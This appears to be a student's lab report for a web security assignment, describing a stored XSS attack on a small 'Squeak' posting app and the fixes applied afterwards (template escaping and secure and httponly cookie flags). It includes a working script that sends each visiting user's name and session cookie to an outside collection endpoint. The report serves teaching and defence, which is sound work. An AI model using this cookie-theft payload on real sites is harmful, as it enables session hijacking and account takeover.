Submission 3:
-changed a few things to keep submission2 workable.old "/" paht is now "/submission2"
-made users like in the example with pw "12345678" and the stand user with username: daniel, pw: fisksoppa from the previous submission.

Stored XSS Atack:
The first attack with "<script>alert('Owned');</script>" was pretty straightforward. I was able to place the script as a "Squeak" and every user who logged in ran the script.	


To get the cookies I used the following squeak and "squeaked" it 
"<script>
var xhttp = new XMLHttpRequest();
console.log(document.getElementsByClassName("input-group-text")[0].innerHTML);
 xhttp.open("POST", "https://dva446.herokuapp.com/store/156", true);
 var username=document.getElementsByClassName("input-group-text")[0].innerHTML;
 xhttp.send(username+":"+document.cookie);
</script>"

I tried to sign in with different users and their data were all sent to "https://dva446.herokuapp.com/store/156" and i could access it to see them.

Countermeasures:
settings the template engine up wasnt so difficult. But because i made the replacements in two steps: first replacing the values like name, card text etc. for every html snippet, combine them and then replace it in the template file. To simulate similar behaviour I used Mustache.render to render locally.
Now everything was unescaped correctly.

I also added the secure and httponly flags when i set cookies.
